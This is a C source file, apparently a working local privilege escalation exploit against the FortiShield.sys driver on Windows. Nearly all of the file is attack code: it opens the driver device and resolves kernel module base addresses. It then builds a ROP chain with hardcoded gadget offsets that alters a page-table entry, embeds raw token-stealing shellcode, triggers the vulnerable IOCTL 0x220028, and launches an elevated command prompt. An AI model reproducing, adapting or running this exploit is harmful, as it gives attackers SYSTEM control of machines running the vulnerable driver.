
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int token_steal ;
typedef char ULONGLONG ;
typedef int SIZE_T ;
typedef int * LPVOID ;
typedef int LPTHREAD_START_ROUTINE ;
typedef int LPDWORD ;
typedef int LPCSTR ;
typedef scalar_t__ HANDLE ;
typedef int DWORD ;
typedef scalar_t__ BOOL ;


 scalar_t__ CreateFile (int ,int,int ,int *,int ,int ,int *) ;
 scalar_t__ CreateThread (int *,int ,int ,int *,int ,int ) ;
 scalar_t__ DeviceIoControl (scalar_t__,int,int *,int,int *,int,int*,int *) ;
 int GENERIC_READ ;
 int GENERIC_WRITE ;
 int * GetBaseAddr (char*) ;
 scalar_t__ GetCurrentProcess () ;
 int GetLastError () ;
 int INFINITE ;
 scalar_t__ INVALID_HANDLE_VALUE ;
 int MEM_COMMIT ;
 int MEM_RESERVE ;
 int OPEN_EXISTING ;
 int PAGE_EXECUTE_READWRITE ;
 scalar_t__ SetThreadPriority (scalar_t__,int ) ;
 int THREAD_PRIORITY_HIGHEST ;
 int * VirtualAlloc (int **,int,int,int ) ;
 int WaitForSingleObject (scalar_t__,int ) ;
 scalar_t__ WriteProcessMemory (scalar_t__,int *,char*,int,int *) ;
 char get_pxe_address_64 (int) ;
 scalar_t__ malloc (int) ;
 int memcpy (char*,char*,int) ;
 int memset (char*,int,int) ;
 int printf (char*,int) ;
 int system (char*) ;
 int trigger_callback ;

int main() {

 HANDLE forti;
 forti = CreateFile((LPCSTR)"\\\\.\\FortiShield", GENERIC_READ | GENERIC_WRITE, 0, ((void*)0), OPEN_EXISTING, 0, ((void*)0));
 if (forti == INVALID_HANDLE_VALUE) {
  printf("[!] Error while creating a handle to the driver: %d\n", GetLastError());
  return 1;
 }

 LPVOID hal_base = GetBaseAddr("hal.dll");
 LPVOID fortishield_base = GetBaseAddr("FortiShield.sys");

 ULONGLONG va_pte = get_pxe_address_64(0x0000000048000000);
 ULONGLONG hal_pivot = (ULONGLONG)hal_base + 0x6bf0;
 ULONGLONG fortishield_callback = (ULONGLONG)fortishield_base + 0xd150;
 ULONGLONG fortishield_restore = (ULONGLONG)fortishield_base + 0x2f73;

 printf("[+] HAL.dll found at: %llx\n", (ULONGLONG)hal_base);
 printf("[+] FortiShield.sys found at: %llx\n", (ULONGLONG)fortishield_base);
 printf("[+] PTE virtual address at: %llx\n", va_pte);

 DWORD IoControlCode = 0x220028;
 ULONGLONG InputBuffer = hal_pivot;
 DWORD InputBufferLength = 0x8;
 ULONGLONG OutputBuffer = 0x0;
 DWORD OutputBufferLength = 0x0;
 DWORD lpBytesReturned;

 HANDLE pid;
 pid = GetCurrentProcess();
 ULONGLONG allocate_address = 0x0000000047FF016F;
 LPVOID allocate_shellcode;
 allocate_shellcode = VirtualAlloc((LPVOID*)allocate_address, 0x12000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 if (allocate_shellcode == ((void*)0)) {
  printf("[!] Error while allocating shellcode: %d\n", GetLastError());
  return 1;
 }

 char *shellcode;
 DWORD shellcode_size = 0x12000;
 ULONGLONG rop_01 = (ULONGLONG)hal_base + 0x668e;
 ULONGLONG rop_02 = 0x0000000000000063;
 ULONGLONG rop_03 = (ULONGLONG)hal_base + 0x987e;
 ULONGLONG rop_04 = va_pte;
 ULONGLONG rop_05 = (ULONGLONG)hal_base + 0xe2cc;
 ULONGLONG rop_06 = (ULONGLONG)hal_base + 0x15a50;
 ULONGLONG rop_07 = allocate_address + 0x10040;
 ULONGLONG rop_08 = fortishield_callback;
 ULONGLONG rop_09 = fortishield_restore;
 char token_steal[] = "\x65\x48\x8B\x14\x25\x88\x01\x00\x00\x4C\x8B\x82\xB8"
                                          "\x00\x00\x00\x4D\x8B\x88\xF0\x02\x00\x00\x49\x8B\x09"
                                          "\x48\x8B\x51\xF8\x48\x83\xFA\x04\x74\x08\x48\x8B\x09"
                                          "\x4C\x39\xC9\x75\xEE\x48\x8B\x41\x68\x24\xF0\x49\x89"
                                          "\x80\x58\x03\x00\x00\x48\x8B\xAC\x24\x80\x00\x00\x00"
                                          "\x48\x31\xDB\x48\x89\x5D\x00\x48\x8B\xAC\x24\x88\x00"
                                          "\x00\x00\x48\x89\xF0\x48\x89\xC4\x48\x83\xEC\x20\xFF\xE5";

 shellcode = (char *)malloc(shellcode_size);
 memset(shellcode, 0x41, shellcode_size);
 memcpy(shellcode + 0x10008, &rop_01, 0x08);
 memcpy(shellcode + 0x10010, &rop_02, 0x08);
 memcpy(shellcode + 0x10018, &rop_03, 0x08);
 memcpy(shellcode + 0x10020, &rop_04, 0x08);
 memcpy(shellcode + 0x10028, &rop_05, 0x08);
 memcpy(shellcode + 0x10030, &rop_06, 0x08);
 memcpy(shellcode + 0x10038, &rop_07, 0x08);
 memcpy(shellcode + 0x10040, token_steal, sizeof(token_steal));
 memcpy(shellcode + 0x100C0, &rop_08, 0x08);
 memcpy(shellcode + 0x100C8, &rop_09, 0x08);

 BOOL WPMresult;
 SIZE_T written;
 WPMresult = WriteProcessMemory(pid, (LPVOID)allocate_address, shellcode, shellcode_size, &written);
 if (WPMresult == 0)
 {
  printf("[!] Error while calling WriteProcessMemory: %d\n", GetLastError());
  return 1;
 }

 HANDLE hThread;
 LPDWORD hThread_id = 0;
 hThread = CreateThread(((void*)0), 0, (LPTHREAD_START_ROUTINE)&trigger_callback, ((void*)0), 0, hThread_id);
 if (hThread == ((void*)0))
 {
  printf("[!] Error while calling CreateThread: %d\n", GetLastError());
  return 1;
 }

 BOOL hThread_priority;
 hThread_priority = SetThreadPriority(hThread, THREAD_PRIORITY_HIGHEST);
 if (hThread_priority == 0)
 {
  printf("[!] Error while calling SetThreadPriority: %d\n", GetLastError());
  return 1;
 }

 BOOL triggerIOCTL;
 triggerIOCTL = DeviceIoControl(forti, IoControlCode, (LPVOID)&InputBuffer, InputBufferLength, (LPVOID)&OutputBuffer, OutputBufferLength, &lpBytesReturned, ((void*)0));
 WaitForSingleObject(hThread, INFINITE);

 system("start cmd.exe");
 return 0;
}
